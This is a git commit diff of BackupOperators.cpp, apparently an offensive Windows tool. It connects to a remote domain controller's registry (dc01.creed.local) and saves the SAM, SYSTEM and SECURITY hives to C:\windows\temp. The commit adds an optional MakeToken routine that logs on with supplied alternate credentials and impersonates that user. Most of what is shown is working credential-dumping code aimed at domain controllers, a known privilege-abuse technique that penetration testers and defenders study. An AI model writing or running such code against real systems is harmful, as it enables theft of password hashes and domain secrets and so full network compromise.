edb87529fea01a68499187e0bdb4aed3f80b7a25
Filip Dragovic <44291883+Wh04m1001@users.noreply.github.com>
2021-12-09 02:15:54 +0100

    Update BackupOperators.cpp

--- BackupOperators.cpp
+++ BackupOperators.cpp
@@ -1,6 +1,22 @@
 #include <stdio.h>
 #include <Windows.h>
 
+void MakeToken() {
+    HANDLE token;
+    const char username[] = "<username>";
+    const char password[] = "<password>";
+    const char domain[] = "<domain>";
+
+    if (LogonUserA(username, domain, password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &token) == 0) {
+        printf("LogonUserA: %d\n", GetLastError());
+        exit(0);
+    }
+    if (ImpersonateLoggedOnUser(token) == 0) {
+        printf("ImpersonateLoggedOnUser: %d\n", GetLastError());
+        exit(0);
+    }
+}
+
 int main()
 {
     HKEY hklm;
@@ -9,7 +25,10 @@ int main()
     const char* hives[] = { "SAM","SYSTEM","SECURITY" };
     const char* files[] = { "C:\\windows\\temp\\sam.hive","C:\\windows\\temp\\system.hive","C:\\windows\\temp\\security.hive" };
     
-    result = RegConnectRegistryA("\\\\<computername>", HKEY_LOCAL_MACHINE,&hklm);
+    //Uncomment if using alternate credentials.
+    //MakeToken();
+
+    result = RegConnectRegistryA("\\\\dc01.creed.local", HKEY_LOCAL_MACHINE,&hklm);
     if (result != 0) {
         printf("RegConnectRegistryW: %d\n", result);
         exit(0);
